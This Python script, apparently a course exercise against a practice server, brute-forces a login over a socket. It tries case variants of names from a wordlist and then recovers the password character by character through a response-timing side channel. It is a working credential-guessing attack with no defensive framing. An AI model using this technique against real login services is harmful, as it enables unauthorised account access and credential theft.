import json
import socket
import string
import sys
import itertools
import time

alphabet_lower = list(string.ascii_lowercase)
alphabet_upper = list(string.ascii_uppercase)
numbers = [x for x in range(10)]

general_list = alphabet_lower + alphabet_upper + numbers

hostname, port = sys.argv[1:]
address = (hostname, int(port))
login = ""
password = " "
ans = {
    'login': login,
    'password': password
}
with socket.socket() as my_socket:
    my_socket.connect(address)
    with open('./hacking/logins.txt') as file:
        for log in file:
            for option in map(lambda x: ''.join(x),
                              itertools.product(*((letter.lower(), letter.upper()) for letter in log.strip()))):
                ans = {
                    'login': option,
                    'password': password
                }
                test = json.dumps(ans)
                my_socket.send(test.encode())
                response = json.loads(my_socket.recv(1024).decode())
                if response["result"] == 'Wrong password!':
                    login = option
                    password = ""
                    while True:
                        for word in itertools.product(general_list):
                            str1 = ''.join(str(x) for x in word)
                            str1 = password + str1
                            ans = {
                                'login': login,
                                'password': str1
                            }
                            test = json.dumps(ans)
                            my_socket.send(test.encode())
                            start = time.perf_counter()
                            response = json.loads(my_socket.recv(1024).decode())
                            final = time.perf_counter()
                            if (final - start) >= 0.09:
                                password = str1
                            if response["result"] == 'Connection success!':
                                ans = {
                                    'login': login,
                                    'password': str1
                                }
                                print(json.dumps(ans))
                                exit()
